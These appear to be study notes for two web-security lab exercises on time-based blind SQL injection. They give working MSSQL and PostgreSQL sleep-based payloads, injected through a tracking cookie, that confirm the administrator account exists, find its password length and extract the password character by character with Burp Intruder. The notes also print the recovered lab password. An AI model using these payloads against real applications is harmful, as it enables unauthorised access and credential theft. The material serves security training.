What if you Trigger a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.

- SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP response
- This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
The first of these inputs will not trigger. The second input will trigger a delay of 10 seconds

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

## Steps to solve Lab-1
### Desc - Blind SQL injection with time delays

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)

2. Now, we are going to perform a query of 10 seconds of delay:
   query --> 
   ```sql
   ' || pg_sleep(10)--
```
[[SQL injection cheat sheet]]
Below performing on burp:
![[SQL_injection_with_time_delays1.png]]

## Steps to solve Lab-2
### Desc - Blind SQL injection with time delays and information retrieval

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)
query -->
```sql
' || pg_sleep(10)--
```

Below performing on burp:
![[blind_SQL_injection_with_time_delay_info_retrieval1.png]]

2. Let's confirm that the administrator user exist and users table exist:
   query --> 
   ```sql
   '|| (SELECT CASE WHEN (username='administrator') then pg_sleep(10) else pg_sleep(-1) END from users)--
```

Below performing on burp:
![[blind_SQL_injection_with_time_delay_info_retrieval2.png]]
**Result** - It takes 10 second to response, it means, **administrator** user exist as well as users table exist.

3. Let's find the length of password:
query --> 
```sql
' || (SELECT CASE WHEN (username='administrator' and LENGTH(password)>21) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```
Now, we are sending this query to **intruder** to find the length of password.

Below performing on burp:
1. Sending the **Repeater** data to **intruder**:
![[blind_SQL_injection_with_time_delay_info_retrieval3.png]]

2. Setting up positions on intruder:
![[blind_SQL_injection_with_time_delay_info_retrieval4.png]]

3. Setting up **Payloads** in intruder:
![[blind_SQL_injection_with_time_delay_info_retrieval5.png]]

4. Setting up **Resource Pool** in intruder:
![[blind_SQL_injection_with_time_delay_info_retrieval6.png]]

5. Start the attack to find the length of password:
![[blind_SQL_injection_with_time_delay_info_retrieval7.png]]
**Result** - The length of password is 20. 

4. Let's find all of the characters of password of **administrator**:
query --> 
```sql
' || (SELECT CASE WHEN (username='administrator' and SUBSTRING(password, 1, 1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```
Now, we are going to brute-force the above by sending the query to **intruder**.

Below performing on burp:
1. Setting data from **Repeater** to **intruder**:
![[blind_SQL_injection_with_time_delay_info_retrieval8.png]]

2. Setting up positions in the **intruder**
![[blind_SQL_injection_with_time_delay_info_retrieval9.png]]

3. Setting up the first **Payload**:
![[blind_SQL_injection_with_time_delay_info_retrieval10.png]]

4. Setting up the second **Payload**:
   ![[blind_SQL_injection_with_time_delay_info_retrieval11.png]]

5. Setting up the **Resource pool**:
![[blind_SQL_injection_with_time_delay_info_retrieval12.png]]

6. After performing the attack the password is:
![[blind_SQL_injection_with_time_delay_info_retrieval13.png]]
**Result** - The password of administrator is "9hhidf3k2lilbf8nnsnq" and the lab is solved.